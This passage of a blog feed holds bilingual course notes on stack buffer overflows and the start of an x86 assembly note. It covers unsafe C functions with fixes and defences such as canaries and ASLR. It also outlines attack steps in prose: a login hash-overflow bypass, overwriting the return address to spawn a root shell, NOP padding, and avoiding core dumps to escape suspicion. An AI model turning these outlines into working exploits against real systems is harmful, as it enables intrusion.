&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Occurs when:&lt;br&gt;
Input is unconstrained&lt;br&gt;
Runs past the end of a buffer, replacing valid (control) data&lt;/li&gt;
&lt;li&gt;Technique that allows:&lt;br&gt;
Your code to be executed by another program&lt;br&gt;
Overflow data area to alter variable values&lt;/li&gt;
&lt;li&gt;Problem: declaration in version of login.c is  &lt;code&gt;char name[80], passwd[80], hash[13];&lt;/code&gt; . Attack login procedure:
&lt;ol&gt;
&lt;li&gt;User types username, which is stored in name&lt;/li&gt;
&lt;li&gt;Compute hash for the corresponding password&lt;/li&gt;
&lt;li&gt;User types password, pads to 80 chars, and types hash for that password&lt;/li&gt;
&lt;li&gt;The program validates password against user-supplied hash; user is in (with any password)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Stack Smashing&lt;br&gt;
 缓冲区溢出攻击的核心是覆盖栈上的 返回地址（ret）。当返回地址被覆盖时，程序在函数返回时不会跳回调用函数的位置，而是跳转到攻击者指定的位置。攻击者可以利用这种技术让程序执行任意代码（如恶意代码或 shellcode），这被称为堆栈破坏。&lt;/li&gt;
&lt;/ol&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Stack Smashing&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;functionA&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *str)&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buffer[&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(buffer, str);   &lt;span class=&#34;comment&#34;&gt;//segmentation fault&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; large_string[&lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; (i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span class=&#34;number&#34;&gt;255&lt;/span&gt;; i++) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		large_string[i] = &lt;span class=&#34;string&#34;&gt;&amp;#x27;A&amp;#x27;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	functionA(large_string); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;buffer&lt;/code&gt; ：在  &lt;code&gt;functionA&lt;/code&gt;  中声明为 16 字节的字符数组。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;strcpy(buffer, str)&lt;/code&gt; ：使用  &lt;code&gt;strcpy&lt;/code&gt;  将外部传入的字符串 str 复制到 buffer 中。由于  &lt;code&gt;strcpy&lt;/code&gt;  不检查长度，如果  &lt;code&gt;str&lt;/code&gt;  的长度超过 16 字节，会导致缓冲区溢出。&lt;/li&gt;
&lt;li&gt;在  &lt;code&gt;main&lt;/code&gt;  中， &lt;code&gt;large_string&lt;/code&gt;  是一个 256 字节的数组，它被填充为 255 个 ‘A’。当  &lt;code&gt;large_string&lt;/code&gt;  被传递给  &lt;code&gt;functionA&lt;/code&gt;  时， &lt;code&gt;buffer&lt;/code&gt;  被溢出。&lt;/li&gt;
&lt;li&gt;修复：  &lt;code&gt;strcpy(buffer, str)&lt;/code&gt;  --&amp;gt;  &lt;code&gt;strncpy(buffer, str, 16);&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/26/671ca87ccb1e2.png&#34; alt=&#34;img&#34;&gt;&lt;br&gt;
 &lt;code&gt;large_str&lt;/code&gt;  has overflowed  &lt;code&gt;buffer&lt;/code&gt;  and  &lt;code&gt;sfp&lt;/code&gt;  and  &lt;code&gt;ret&lt;/code&gt;  and  &lt;code&gt;*str&lt;/code&gt; .Note that  &lt;code&gt;ret&lt;/code&gt;  is the return address!&lt;br&gt;
This means we can get the function to return to any point in the code that we specify.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Buffer overflows allow us to change return address
&lt;ol&gt;
&lt;li&gt;Can point to any function in the library&lt;/li&gt;
&lt;li&gt;Can point to own code&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Add code in the overflowed buffer
&lt;ol&gt;
&lt;li&gt;Run at privilege of process (very useful if root!)&lt;/li&gt;
&lt;li&gt;Even a small buffer can invoke a shell using the system call (often called shellcode)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Attacker would like to run shell at root level
&lt;ol&gt;
&lt;li&gt;Make system call to  &lt;code&gt;execve&lt;/code&gt; , passing  &lt;code&gt;/bin/sh&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Needs to be part of the buffer, and in assembly code (以便精确控制其大小和功能)&lt;/li&gt;
&lt;li&gt;Program has to fit in buffer without overwriting return address (如果 shellcode 覆盖了返回地址本身，可能导致程序崩溃而无法执行攻击代码)&lt;/li&gt;
&lt;li&gt;Pad out buffer to return address, and point return address to start of buffer&lt;/li&gt;
&lt;li&gt;Don’t generate core dump (this will cause suspicion)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;What do You Need to Hack a Buffer Overflow
&lt;ol&gt;
&lt;li&gt;Address where buffer begins&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Easy to get if you have access to the same type of system being attacked&lt;/li&gt;
&lt;li&gt;Can use Null Operation (NOP) commands to make the target address bigger&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Location where return address is stored&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Can pad out the buffer with return address&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Assembly language program to spawn a shell (shellcode payload)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Can use gdb to disassemble a program for you&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Affected Languages&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Buffer overflows mainly occur in low-level programming languages that allow direct memory access: Assembler, C, C++&lt;br&gt;
Note that some high-level languages such as Java, C# and Visual Basic are written in C, C++ or call modules written in these languages&lt;/p&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;
&lt;p&gt;Buffer Overflow Examples&lt;br&gt;
Functions that handle arrays but do not check length (checking for termination character is insufficient) In C/C++,   &lt;code&gt;gets&lt;/code&gt; ,  &lt;code&gt;strcpy&lt;/code&gt; ,  &lt;code&gt;strcat&lt;/code&gt; ,  &lt;code&gt;sprintf&lt;/code&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Example 1&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; gets(buf);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;char buf[20]&lt;/code&gt; ：定义了一个长度为 20 的字符数组  &lt;code&gt;buf&lt;/code&gt; 。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;gets(buf)&lt;/code&gt; ：使用  &lt;code&gt;gets()&lt;/code&gt;  函数从标准输入读取字符串，并存储在  &lt;code&gt;buf&lt;/code&gt;  中&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;gets()&lt;/code&gt;  函数不检查输入的长度，意味着如果输入的字符串长度超过了  &lt;code&gt;buf&lt;/code&gt;  的大小（20 字节），则会发生缓冲区溢出。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;修复：  &lt;code&gt;fgets(buf, sizeof(buf), stdin);&lt;/code&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Example 2&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; prefix[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://&amp;quot;&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   ... &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;// copies the string prefix to buf &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(buf, prefix); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;comment&#34;&gt;// concatenates path to the string buf &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;built_in&#34;&gt;strncat&lt;/span&gt;(buf, path, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(buf));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;char buf[20]&lt;/code&gt; ：定义了一个长度为 20 字节的字符数组  &lt;code&gt;buf&lt;/code&gt; 。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;char prefix[] = &amp;quot;http://&amp;quot;;&lt;/code&gt; ：定义了一个包含字符串  &lt;code&gt;&amp;quot;http://&amp;quot;&lt;/code&gt;  的字符数组。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;strcpy(buf, prefix)&lt;/code&gt; ：将字符串  &lt;code&gt;&amp;quot;http://&amp;quot;&lt;/code&gt;  复制到  &lt;code&gt;buf&lt;/code&gt;  中。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;问题： &lt;code&gt;&amp;quot;http://&amp;quot;&lt;/code&gt;  长度为 7 字节（包括终止符 \0），在复制后， &lt;code&gt;buf&lt;/code&gt;  中只剩下 13 个字节可用。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;strncat(buf, path, sizeof(buf))&lt;/code&gt; ：将字符串  &lt;code&gt;path&lt;/code&gt;  连接到  &lt;code&gt;buf&lt;/code&gt;  中，指定的最大长度为  &lt;code&gt;sizeof(buf)&lt;/code&gt; （即 20 字节）。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;问题：这里的  &lt;code&gt;sizeof(buf)&lt;/code&gt;  是 20 字节，但在前面已经用掉了 7 字节（包括终止符）。 &lt;code&gt;strncat()&lt;/code&gt;  试图追加  &lt;code&gt;path&lt;/code&gt;  的内容时，可能会超出  &lt;code&gt;buf&lt;/code&gt;  的剩余空间（13 字节），导致缓冲区溢出。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;修复： &lt;code&gt;strncat(buf, path, sizeof(buf) - strlen(buf) - 1);&lt;/code&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Example 3&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;built_in&#34;&gt;strncpy&lt;/span&gt;(buf, data, &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(data)); &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;strncpy(buf, data, strlen(data))&lt;/code&gt; ：将字符串  &lt;code&gt;data&lt;/code&gt;  复制到  &lt;code&gt;buf&lt;/code&gt;  中，复制的长度为  &lt;code&gt;strlen(data)&lt;/code&gt; 。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;缺陷 1：缺少终止符 \0： &lt;code&gt;strncpy&lt;/code&gt;  不会自动添加字符串的终止符  &lt;code&gt;\0&lt;/code&gt; ，如果  &lt;code&gt;data&lt;/code&gt;  的长度等于或大于 32，那么  &lt;code&gt;buf&lt;/code&gt;  不会以  &lt;code&gt;\0&lt;/code&gt;  结尾。这可能导致  &lt;code&gt;buf&lt;/code&gt;  被当作未终止的字符串处理，带来不确定的行为或安全风险。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;缺陷 2：可能的缓冲区溢出：如果  &lt;code&gt;strlen(data) &amp;gt; 32&lt;/code&gt; ， &lt;code&gt;strncpy&lt;/code&gt;  将尝试复制超过  &lt;code&gt;buf&lt;/code&gt;  大小的内容，导致缓冲区溢出。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;修复： &lt;code&gt;strncpy(buf, data, sizeof(buf) - 1); buf[sizeof(buf) - 1] = &#39;\0&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Example 4&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
 &lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption&gt;&lt;span&gt;OvO&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[MAX_PATH]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;built_in&#34;&gt;sprintf&lt;/span&gt;(buf, &lt;span class=&#34;string&#34;&gt;&amp;quot;%s - %d\n&amp;quot;&lt;/span&gt;, path, errno);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sprintf(buf, &amp;quot;%s - %d\n&amp;quot;, path, errno)&lt;/code&gt;  会将  &lt;code&gt;path&lt;/code&gt;  和  &lt;code&gt;errno&lt;/code&gt;  的格式化字符串复制到  &lt;code&gt;buf&lt;/code&gt;  中。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sprintf&lt;/code&gt;  不检查  &lt;code&gt;buf&lt;/code&gt;  的大小是否足以容纳格式化后的结果。如果  &lt;code&gt;path&lt;/code&gt;  很长，加上数字  &lt;code&gt;errno&lt;/code&gt;  和其他字符，可能会超过  &lt;code&gt;MAX_PATH&lt;/code&gt; ，导致缓冲区溢出。&lt;/li&gt;
&lt;li&gt;修复：  &lt;code&gt;snprintf(buf, sizeof(buf), &amp;quot;%s - %d\n&amp;quot;, path, errno);&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;Stack buffer overflow prevention&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Stack buffer overflow prevention&#34;&gt;#&lt;/a&gt;Stack buffer overflow prevention&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Spotting Buffer Overflows&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Check inputs, whether read from the network, a file, or from the command line&lt;/li&gt;
&lt;li&gt;Check transfer of data from said input to internal structures&lt;/li&gt;
&lt;li&gt;Look for use of unsafe string handling calls&lt;/li&gt;
&lt;li&gt;Look for use of arithmetic to calculate an allocation size or remaining buffer size&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Fixing Buffer Overflows&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Replace dangerous string handling functions&lt;/li&gt;
&lt;li&gt;Replace C string buffers with C++ strings&lt;/li&gt;
&lt;li&gt;Replace static arrays with STL containers&lt;/li&gt;
&lt;li&gt;Use analysis tools, Examples include Fortify, Coverity, PREfast, and Klocwor&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Code Analysis&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Statically check source to detect buffer overflows s&lt;/li&gt;
&lt;li&gt;Several tools exist to automate the review process&lt;br&gt;
Stanford:  Engler, et al.  Test trust inconsistency&lt;br&gt;
@stake.com  (&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2wwcGh0LmNvbQ==&#34;&gt;l0pht.com&lt;/span&gt;): SLINT (designed for UNIX)&lt;br&gt;
Berkeley:  Wagner, et al.  Test constraint violations&lt;/li&gt;
&lt;li&gt;Find lots of bugs, but not all&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Marking Stack as Non-Execute&lt;br&gt;
Basic stack exploit can be prevented by marking stack segment as non-executable&lt;br&gt;
Limitations and Problems&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Some apps need executable stack (e.g. LISP interpreters)&lt;/li&gt;
&lt;li&gt;Does not block more general overflow exploits&lt;/li&gt;
&lt;li&gt;Overflow on heap: overflow buffer next to func pointer&lt;/li&gt;
&lt;li&gt;Cannot make all the data segment non-executable&lt;/li&gt;
&lt;li&gt;More recent UNIX and MS windows emit dynamic code into program data for performance optimisations&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Stack Protection and Run-time Checking&lt;br&gt;
Many run-time checking techniques
&lt;ol&gt;
&lt;li&gt;Example:  StackGuard (WireX)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Run time tests for stack integrity&lt;/li&gt;
&lt;li&gt;Code generator for emitting code to set up and tear down functions&lt;/li&gt;
&lt;li&gt;Embeds “canaries” in stack frames and verify their integrity prior to function return&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Libsafe (Avaya Labs)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Dynamically loaded library&lt;/li&gt;
&lt;li&gt;Intercepts calls to  &lt;code&gt;strcpy (dest, src)&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;Validate sufficient space in current stack frame: |framepointer–dest| &amp;gt; strlen(src)&lt;/li&gt;
&lt;li&gt;If so, does strcpy. Otherwise, terminates application&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Address obfuscation (Stony Brook’03)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Encrypt return address on stack by XORing with random string. Decrypt just before returning from function&lt;/li&gt;
&lt;li&gt;Attacker needs decryption key to set return address to desired value&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;7&#34;&gt;
&lt;li&gt;PaX ASLR: Randomise location of libc&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Attacker cannot jump directly to exec function&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/course/x86-architecture-and-Assembly-basics/</guid>
            <title>x86 architecture and Assembly basics</title>
            <link>http://example.com/course/x86-architecture-and-Assembly-basics/</link>
            <category>software security</category>
            <category>Linux</category>
            <category>C language</category>
            <category>gdb</category>
            <pubDate>Fri, 25 Oct 2024 17:43:11 +1000</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34; x86 architecture&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;# x86 architecture&#34;&gt;#&lt;/a&gt; x86 architecture&lt;/h1&gt;
&lt;h2 id=&#34;Levels of Abstraction&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Levels of Abstraction&#34;&gt;#&lt;/a&gt; Levels of Abstraction&lt;/h2&gt;
&lt;p&gt;抽象层次（Levels of Abstraction） 是指在计算机系统设计中，将复杂的系统分解为不同的层次，以便于理解、设计和实现。每个抽象层都基于更底层的层次，同时也为更高层次提供基础。这种层次化的设计方式使得复杂系统的开发和维护更加高效。以下是这些抽象层次的具体解释：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;硬件层（Hardware Level）&lt;br&gt;
解释：这是最底层的抽象层，主要是由各种电子电路和逻辑门（如 XOR、AND、OR、NOT 门等）组成。这些电路实现了最基本的逻辑运算和数据处理，是计算机所有功能的基础。&lt;br&gt;
特点：这一层是最接近物理硬件的，直接处理电信号和物理开关状态。&lt;/li&gt;
&lt;li&gt;微码层（Microcode Level）/ 固件层（Firmware Level）&lt;br&gt;
解释：微码（或固件）是一种嵌入在硬件中的特殊程序，用来解释机器指令并控制底层硬件的操作。它位于硬件和机器码之间。&lt;br&gt;
特点：微码作为硬件与机器码的桥梁，是指令执行的控制逻辑，可以在不改变硬件的情况下更新或调整计算机的功能。&lt;/li&gt;
&lt;li&gt;机器码层（Machine Code Level）&lt;br&gt;
解释：机器码是计算机直接执行的二进制代码，通常以操作码（opcodes）和十六进制数字形式表示。它由一系列低级指令组成，用于控制计算机的处理器执行任务。&lt;br&gt;
特点：机器码是最底层的可编程语言，只有计算机可以直接执行，由处理器按照指令执行具体操作。&lt;/li&gt;
&lt;li&gt;低级语言层（Low-Level Languages Level）&lt;br&gt;
解释：低级语言是机器码的人类可读版本，例如汇编语言（Assembly Language）。它使用助记符（如 MOV、ADD、JMP 等）来代表机器指令，更易于编程和调试。&lt;br&gt;
特点：低级语言紧密对应计算机的硬件结构，编程者需要了解具体的计算机架构，适合编写操作系统、驱动程序和嵌入式系统。&lt;/li&gt;
&lt;li&gt;高级语言层（High-Level Languages Level）&lt;br&gt;
解释：高级语言（如 C、C++、Java 等）提供了更抽象、更人性化的语法和结构，使得编程者可以更轻松地编写复杂的程序。这些语言中的代码通过编译器转换成机器码。&lt;br&gt;
特点：高级语言通常具有良好的跨平台性和可移植性，编程效率高，适合开发应用程序和大型软件系统。&lt;/li&gt;
&lt;li&gt;解释型语言层（Interpreted Languages Level）&lt;br&gt;
解释：解释型语言（如 Python、JavaScript）不是直接编译成机器码，而是先被翻译成字节码，然后在解释器中执行。&lt;br&gt;
特点：解释型语言更灵活，适合快速开发和原型设计，但执行速度通常比编译型语言慢。&lt;/li&gt;
&lt;li&gt;字节码层（Bytecode Level）&lt;br&gt;
解释：字节码是高级语言在被解释执行之前的中间形式。解释器将字节码翻译为机器可以执行的指令。&lt;br&gt;
特点：字节码的设计通常与硬件无关，可以在不同的平台上被相同的解释器执行，例如 Java 和 Python 的虚拟机（JVM、Python Interpreter）都使用字节码。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img.picui.cn/free/2024/10/25/671b4d8733f64.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;Assembly&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Assembly&#34;&gt;#&lt;/a&gt; Assembly&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;汇编语言（Assembly Language） 是一种低级编程语言，它与计算机的机器码有着一一对应的关系，并且比机器码更易于人类理解和编写。以下是对汇编语言及相关概念的详细中文解释：&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;汇编语言的定义&lt;br&gt;
